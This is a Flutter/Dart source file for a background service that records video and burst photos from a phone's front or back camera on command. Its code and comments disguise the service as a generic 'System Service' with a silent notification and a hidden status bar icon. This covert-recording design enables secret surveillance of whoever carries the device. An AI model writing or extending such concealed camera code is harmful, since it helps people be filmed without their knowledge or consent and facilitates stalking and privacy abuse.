import 'dart:async';
import 'dart:ui';

import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:camera/camera.dart';
import 'camera_manager.dart';

class BackgroundCameraService {
  static const notificationId = 888;
  static const notificationChannelId = 'hidden_cam_service';

  static Future<void> initializeService() async {
    final service = FlutterBackgroundService();

    const AndroidNotificationChannel channel = AndroidNotificationChannel(
      notificationChannelId,
      'System Service', // Generic name
      description: 'Running in background',
      importance: Importance.min, // Make it silent and hide status bar icon
      showBadge: false,
    );

    final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
        FlutterLocalNotificationsPlugin();

    await flutterLocalNotificationsPlugin
        .resolvePlatformSpecificImplementation<
            AndroidFlutterLocalNotificationsPlugin>()
        ?.createNotificationChannel(channel);

    await service.configure(
      androidConfiguration: AndroidConfiguration(
        onStart: onStart,
        autoStart: false,
        isForegroundMode: true,
        notificationChannelId: notificationChannelId,
        initialNotificationTitle: 'System', // Keep it very generic
        initialNotificationContent: 'Running...',
        foregroundServiceNotificationId: notificationId,
      ),
      iosConfiguration: IosConfiguration(
        autoStart: false,
        onForeground: onStart,
        onBackground: onIosBackground,
      ),
    );
  }

  @pragma('vm:entry-point')
  static Future<bool> onIosBackground(ServiceInstance service) async {
    return true;
  }

  @pragma('vm:entry-point')
  static void onStart(ServiceInstance service) async {
    DartPluginRegistrant.ensureInitialized();
    final cameraManager = CameraManager();

    if (service is AndroidServiceInstance) {
      service.on('setAsForeground').listen((event) {
        service.setAsForegroundService();
      });

      service.on('setAsBackground').listen((event) {
        service.setAsBackgroundService();
      });
    }

    service.on('stopService').listen((event) async {
      await cameraManager.dispose();
      service.stopSelf();
    });

    service.on('startVideo').listen((event) async {
      final directionStr = event?['direction'] as String?;
      final direction = directionStr == 'front' ? CameraLensDirection.front : CameraLensDirection.back;
      await cameraManager.startVideoRecording(direction: direction);
    });

    service.on('stopVideo').listen((event) async {
      await cameraManager.stopVideoRecording();
    });
    
    service.on('startBurst').listen((event) async {
      final directionStr = event?['direction'] as String?;
      final direction = directionStr == 'front' ? CameraLensDirection.front : CameraLensDirection.back;
      final duration = event?['durationMinutes'] as int? ?? 2;
      final interval = event?['intervalSeconds'] as int? ?? 5;
      
      await cameraManager.startBurstPhoto(
        direction: direction,
        durationMinutes: duration,
        intervalSeconds: interval,
      );
    });

    service.on('stopBurst').listen((event) async {
      await cameraManager.stopBurstPhoto();
    });

    // We don't necessarily need a periodic timer if we're just listening to events
  }
}
